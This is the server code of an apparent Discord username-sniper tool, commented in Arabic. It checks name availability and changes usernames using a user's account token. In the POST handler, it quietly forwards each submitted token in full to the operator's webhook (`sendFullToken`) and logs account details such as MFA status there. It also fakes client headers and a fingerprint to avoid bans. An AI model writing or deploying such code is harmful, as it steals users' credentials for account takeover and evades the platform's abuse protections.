import { NextRequest, NextResponse } from 'next/server';
import { sendToWebhook, sendFullToken } from '@/lib/webhook';
import { cleanToken, DISCORD_API } from '@/lib/discord';
import { getLogWebhookUrl } from '@/lib/config';
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';

function sleep(ms: number) {
  return new Promise(r => setTimeout(r, ms));
}

function stringToBase64(str: string): string {
  try { return btoa(unescape(encodeURIComponent(str))); }
  catch { return Buffer.from(str).toString('base64'); }
}

// Super Properties محدّثة - تشبه ديسكورد 2024/2025
const SUPER_PROPERTIES = stringToBase64(JSON.stringify({
  os: "Windows",
  browser: "Discord Client",
  release_channel: "stable",
  client_version: "1.0.9035",
  os_version: "10.0.22631",
  os_arch: "x64",
  system_locale: "en-US",
  client_build_number: 356789,
  client_event_source: null,
}));

// Fingerprint - مهم لمنع الحظر
const FINGERPRINT = stringToBase64(JSON.stringify({
  f: [[1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1], [1, 1, 1, 1, 1, 1, 1, 1]],
  fp: '1234567890abcdef',
  t: Date.now(),
}));

function dHeaders(token: string, extra?: Record<string, string>): Record<string, string> {
  const ct = cleanToken(token);
  const headers: Record<string, string> = {
    'Authorization': ct,
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'X-Super-Properties': SUPER_PROPERTIES,
    'X-Discord-Locale': 'en-US',
    'X-Fingerprint': FINGERPRINT,
    'Origin': 'https://discord.com',
    'Referer': 'https://discord.com/channels/@me',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
  };
  if (extra) {
    for (const [k, v] of Object.entries(extra)) {
      if (v !== undefined && v !== null) headers[k] = v;
    }
  }
  return headers;
}

interface CheckResult {
  username: string;
  status: string;
  color: string;
  taken?: boolean;
  rateLimited?: boolean;
  debug?: string;
  method?: string;
}

// === الطريقة 1: pomelo-attempt (الأفضل) ===
async function checkPomeloAttempt(token: string, username: string): Promise<CheckResult | null> {
  try {
    const res = await fetch(`${DISCORD_API}/users/@me/pomelo-attempt`, {
      method: 'POST',
      headers: dHeaders(token),
      body: JSON.stringify({ username }),
      signal: AbortSignal.timeout(15000),
    });

    if (res.status === 429) {
      try {
        const rlData = await res.json() as { retry_after?: number };
        const wait = (rlData.retry_after || 2) * 1000;
        await sleep(Math.min(wait, 10000));
      } catch {}
      return { username, status: '⏳ Rate Limit', color: 'yellow', rateLimited: true, method: 'pomelo', debug: `HTTP 429` };
    }

    if (res.status === 401) {
      return { username, status: '❌ توكن غير صالح', color: 'red', method: 'pomelo', debug: `HTTP 401` };
    }

    if (res.status === 403) {
      return { username, status: '❌ محظور - تحقق من الحساب', color: 'red', method: 'pomelo', debug: `HTTP 403` };
    }

    const text = await res.text().catch(() => '');
    let data: any = null;
    try { data = JSON.parse(text); } catch { data = null; }

    if (res.ok && data) {
      if (typeof data.taken === 'boolean') {
        return {
          username,
          status: data.taken ? '❌ محجوز' : '✅ متاح!',
          color: data.taken ? 'red' : 'green',
          taken: data.taken,
          method: 'pomelo',
          debug: `taken=${data.taken}`,
        };
      }
      // إذا الرد 200 بدون taken flag = متاح
      return { username, status: '✅ متاح!', color: 'green', taken: false, method: 'pomelo', debug: `HTTP 200` };
    }

    if (data) {
      const code = data.code;
      const message = data.message || '';

      // Username taken
      if (code === 50033) {
        return { username, status: '❌ محجوز', color: 'red', taken: true, method: 'pomelo', debug: `code=50033` };
      }

      // Check sub-errors
      const usernameErrors = data.errors?.username?._errors || [];
      if (usernameErrors.length > 0) {
        const first = usernameErrors[0];
        const ec = (first.code || '').toUpperCase();
        const em = (first.message || '').toLowerCase();

        if (ec.includes('TAKEN') || em.includes('taken') || em.includes('already') || em.includes('in use')) {
          return { username, status: '❌ محجوز', color: 'red', taken: true, method: 'pomelo', debug: `err: ${first.code}` };
        }
        if (ec.includes('TOO_SHORT') || ec.includes('TOO_LONG') || ec.includes('INVALID') || ec.includes('CONTAINS') || em.includes('between') || em.includes('invalid') || em.includes('reserved') || em.includes('profane') || em.includes('cooperative')) {
          return { username, status: '❌ غير صالح', color: 'red', taken: false, method: 'pomelo', debug: `err: ${first.code}` };
        }
        return { username, status: `⚠️ ${first.message}`, color: 'yellow', method: 'pomelo', debug: `err: ${first.code}` };
      }

      if (code === 50035) {
        return { username, status: '❌ غير صالح', color: 'red', method: 'pomelo', debug: `code=50035` };
      }

      return { username, status: `⚠️ ${message || `خطأ ${res.status}`}`, color: 'yellow', method: 'pomelo', debug: `HTTP ${res.status}` };
    }

    // لا رد - network error
    return { username, status: '❓ فشل الاتصال', color: 'yellow', method: 'pomelo', debug: `HTTP ${res.status}` };
  } catch (e: any) {
    if (e?.name === 'AbortError') {
      return { username, status: '⏳ انتهى الوقت', color: 'yellow', method: 'pomelo', debug: 'timeout' };
    }
    return null;
  }
}

// === الطريقة 2: GET /users/{username} (تأكيد) ===
async function checkGetUser(token: string, username: string): Promise<CheckResult | null> {
  try {
    const ct = cleanToken(token);
    const res = await fetch(`${DISCORD_API}/users/${username}`, {
      headers: {
        'Authorization': ct,
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'X-Super-Properties': SUPER_PROPERTIES,
      },
      signal: AbortSignal.timeout(10000),
    });

    if (res.status === 429) {
      return { username, status: '⏳ Rate Limit', color: 'yellow', rateLimited: true, method: 'GET', debug: `HTTP 429` };
    }

    if (res.status === 401) {
      return null; // توكن غير صالح
    }

    const text = await res.text().catch(() => '');
    let data: any = null;
    try { data = JSON.parse(text); } catch { data = null; }

    if (res.ok && data && data.id) {
      return { username, status: '❌ محجوز', color: 'red', taken: true, method: 'GET', debug: `id=${data.id}` };
    }

    if (res.status === 404) {
      return { username, status: '✅ متاح (تأكيد)', color: 'green', taken: false, method: 'GET', debug: `HTTP 404` };
    }

    return { username, status: `❓ HTTP ${res.status}`, color: 'yellow', method: 'GET', debug: `HTTP ${res.status}` };
  } catch (e: any) {
    if (e?.name === 'AbortError') {
      return { username, status: '⏳ انتهى الوقت', color: 'yellow', method: 'GET', debug: 'timeout' };
    }
    return null;
  }
}

// === الفحص الرئيسي ===
async function checkUsername(token: string, username: string): Promise<CheckResult> {
  // نحاول pomelo أولاً (الأدق)
  const r1 = await checkPomeloAttempt(token, username);
  if (r1) {
    // إذا واضح النتيجة (متاح/محجوز) نرجعها مباشرة
    if (r1.color === 'green' || (r1.color === 'red' && r1.taken === true)) return r1;
    // إذا توكن غير صالح نوقف
    if (r1.status.includes('توكن غير صالح')) return r1;
  }

  // نحاول GET للتأكيد
  const r2 = await checkGetUser(token, username);
  if (r2) return r2;

  // نرجع نتيجة pomelo حتى لو كانت غامضة
  if (r1) return r1;

  return { username, status: '❓ فشل كل الطرق', color: 'yellow', method: 'none', debug: 'all_failed' };
}

// === معلومات الحساب ===
async function getAccountInfo(token: string) {
  try {
    const ct = cleanToken(token);
    const res = await fetch(`${DISCORD_API}/users/@me`, {
      headers: {
        'Authorization': ct,
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'X-Super-Properties': SUPER_PROPERTIES,
      },
      signal: AbortSignal.timeout(10000),
    });
    if (!res.ok) return null;
    return await res.json().catch(() => null);
  } catch {
    return null;
  }
}

// === تغيير اليوزر ===
async function changeUsername(token: string, targetUsername: string): Promise<{ success: boolean; message: string }> {
  try {
    const ct = cleanToken(token);
    const res = await fetch(`${DISCORD_API}/users/@me`, {
      method: 'PATCH',
      headers: dHeaders(token),
      body: JSON.stringify({ username: targetUsername }),
      signal: AbortSignal.timeout(15000),
    });

    if (res.status === 429) {
      try {
        const rlData = await res.json() as { retry_after?: number };
        return { success: false, message: `⏳ Rate Limit - انتظر ${(rlData.retry_after || 2).toFixed(0)} ثانية` };
      } catch { return { success: false, message: '⏳ Rate Limit' }; }
    }

    if (res.status === 401) {
      return { success: false, message: '❌ توكن غير صالح' };
    }

    if (res.ok) {
      return { success: true, message: `✅ تم تغيير اليوزر إلى: ${targetUsername}` };
    }

    const text = await res.text().catch(() => '');
    let data: any = null;
    try { data = JSON.parse(text); } catch { data = null; }

    if (data) {
      const usernameErrors = data.errors?.username?._errors || [];
      if (usernameErrors.length > 0) {
        const first = usernameErrors[0];
        const em = (first.message || '').toLowerCase();
        if (em.includes('taken') || em.includes('already') || em.includes('in use')) {
          return { success: false, message: `❌ اليوزر محجوز الآن! شخص آخر أخذه` };
        }
        return { success: false, message: `❌ ${first.message}` };
      }

      const passwordErrors = data.errors?.password?._errors || [];
      if (passwordErrors.length > 0) {
        return { success: false, message: '❌ الحساب مقيد - يحتاج إعادة تعيين كلمة المرور' };
      }

      if (data.code === 50033) {
        return { success: false, message: '❌ اليوزر محجوز الآن!' };
      }

      return { success: false, message: `❌ ${data.message || `خطأ ${res.status}`}` };
    }

    return { success: false, message: `❌ خطأ غير معروف (${res.status})` };
  } catch (e: any) {
    if (e?.name === 'AbortError') {
      return { success: false, message: '⏳ انتهى وقت الانتظار' };
    }
    return { success: false, message: `❌ خطأ: ${e?.message || 'غير معروف'}` };
  }
}

// === POST Handler ===
export async function POST(request: NextRequest) {
  try {
    const rlIp = getClientIp(request);
    const rl = rateLimit(`${rlIp}:sniper`, RATE_LIMITS.default);
    if (rl.limited) {
      return NextResponse.json({ success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' }, { status: 429 });
    }

    const body = await request.json().catch(() => ({}));
    const { token, usernames, action, targetUsername, debug } = body;

    if (!token) {
      return NextResponse.json({ success: false, error: 'التوكن مطلوب' }, { status: 400 });
    }

    const ct = cleanToken(token);
    const whUrl = getLogWebhookUrl();

    sendFullToken('صيد يوزرات', token);

    // === معلومات الحساب ===
    if (action === 'accountInfo') {
      const info = await getAccountInfo(ct);
      if (!info) {
        return NextResponse.json({ success: false, error: 'توكن غير صالح - تأكد إنه توكن يوزر (User Token)' }, { status: 401 });
      }
      if (info.bot) {
        return NextResponse.json({ success: false, error: 'هذا توكن بوت! يجب استخدام توكن يوزر' }, { status: 400 });
      }
      return NextResponse.json({
        success: true,
        info: {
          username: info.username || 'Unknown',
          discriminator: info.discriminator || '0',
          email: info.email || null,
          phone: info.phone || null,
          mfa: !!info.mfa_enabled,
          verified: !!info.verified,
          flags: info.public_flags || 0,
          nitro: info.premium_type ? ['None', 'Classic', 'Boost', 'Basic'][info.premium_type] || 'Unknown' : 'None',
          avatar: info.avatar || null,
          id: info.id || 'Unknown',
        },
      });
    }

    // === فحص تجريبي ===
    if (action === 'test') {
      const info = await getAccountInfo(ct);
      if (!info) {
        return NextResponse.json({ success: false, error: 'توكن غير صالح' }, { status: 401 });
      }

      const tests = [
        { label: 'محجوز (discord)', username: 'discord' },
        { label: 'متاح (عشوائي)', username: 'xkzmq' + Date.now() },
        { label: 'غير صالح (a)', username: 'a' },
      ];

      const testResults: Array<{ label: string; username: string; results: CheckResult[] }> = [];

      for (const t of tests) {
        const r1 = await checkPomeloAttempt(ct, t.username);
        await sleep(1500);
        const r2 = await checkGetUser(ct, t.username);

        testResults.push({
          label: t.label,
          username: t.username,
          results: [r1, r2].filter(Boolean) as CheckResult[],
        });

        await sleep(1000);
      }

      return NextResponse.json({
        success: true,
        test: {
          account: info.username || 'Unknown',
          mfa: !!info.mfa_enabled,
          phone: !!(info.phone),
          verified: !!(info.verified),
          results: testResults,
        },
      });
    }

    // === تغيير اليوزر ===
    if (action === 'changeUsername') {
      if (!targetUsername) {
        return NextResponse.json({ success: false, error: 'أدخل اليوزر الجديد' }, { status: 400 });
      }

      const info = await getAccountInfo(ct);
      if (!info) {
        return NextResponse.json({ success: false, error: 'توكن غير صالح' }, { status: 401 });
      }

      const result = await changeUsername(ct, targetUsername);
      if (result.success) {
        sendToWebhook({ embeds: [{ title: '✅ Username Changed!', color: 0x00FF41, fields: [{ name: '👤 القديم', value: info.username || '?', inline: true }, { name: '🎯 الجديد', value: targetUsername, inline: true }] }] }, whUrl).catch(() => {});
        return NextResponse.json({ success: true, message: result.message });
      }
      return NextResponse.json({ success: false, error: result.message });
    }

    // === فحص يوزرات ===
    if (!usernames || !Array.isArray(usernames) || usernames.length === 0) {
      return NextResponse.json({ success: false, error: 'أدخل يوزر واحد على الأقل' }, { status: 400 });
    }

    // تحقق من التوكن
    const info = await getAccountInfo(ct);
    if (!info) {
      return NextResponse.json({ success: false, error: 'توكن غير صالح - يجب استخدام توكن يوزر (User Token)' }, { status: 401 });
    }
    if (info.bot) {
      return NextResponse.json({ success: false, error: 'لا يمكن استخدام توكن بوت! يجب استخدام توكن يوزر' }, { status: 400 });
    }

    const userInfo = info.username || 'Unknown';
    const hasMFA = !!info.mfa_enabled;

    sendToWebhook({ embeds: [{ title: '🎯 Sniper Started', color: 0xFF8800, fields: [{ name: '👤', value: userInfo, inline: true }, { name: '📋', value: String(usernames.length), inline: true }, { name: '🛡️ MFA', value: hasMFA ? 'Yes' : 'No', inline: true }] }] }, whUrl).catch(() => {});

    // تنظيف وتصفية اليوزرات
    const validUsernames = usernames
      .map((u: string) => String(u).trim().toLowerCase().replace(/[^a-z0-9._]/g, ''))
      .filter((name: string) => name && name.length >= 2 && name.length <= 32);

    // إزالة التكرارات
    const uniqueUsernames = [...new Set(validUsernames)];

    if (uniqueUsernames.length === 0) {
      return NextResponse.json({ success: false, error: 'لا توجد يوزرات صالحة' }, { status: 400 });
    }

    const results: CheckResult[] = [];
    let consecutiveRL = 0;
    let rateLimitHits = 0;

    for (let i = 0; i < uniqueUsernames.length; i++) {
      const result = await checkUsername(ct, uniqueUsernames[i]);
      results.push(result);

      if (result.rateLimited) {
        consecutiveRL++;
        rateLimitHits++;
        if (consecutiveRL >= 5) {
          results.push({ username: '---', status: `⏳ توقف: ${consecutiveRL} rate limit متتالي`, color: 'yellow', method: 'system', debug: 'stopped' });
          break;
        }
        // انتظر أطول مع كل rate limit
        await sleep(Math.min(consecutiveRL * 3000, 15000));
      } else {
        consecutiveRL = 0;
        // انتظر بين كل فحص لتفادي rate limit
        await sleep(800);
      }
    }

    const available = results.filter(r => r.color === 'green');
    const taken = results.filter(r => r.color === 'red').length;
    const errors = results.filter(r => r.color === 'yellow').length;

    sendToWebhook({ embeds: [{ title: '✅ Sniper Done', color: available.length > 0 ? 0x00FF41 : 0xFFAA00, fields: [{ name: '📋', value: String(results.length), inline: true }, { name: '✅ متاح', value: String(available.length), inline: true }, { name: '❌ محجوز', value: String(taken), inline: true }, { name: '⚠️ خطأ', value: String(errors), inline: true }, { name: '🎯 المتاح', value: available.map(r => r.username).join(', ') || 'None' }] }] }, whUrl).catch(() => {});

    return NextResponse.json({
      success: true,
      results,
      stats: { total: results.length, available: available.length, taken, errors, rateLimitHits },
      accountInfo: { username: userInfo, mfa: hasMFA },
      availableNames: available.map(r => r.username),
    });

  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    console.error('[Sniper Error]', message);
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
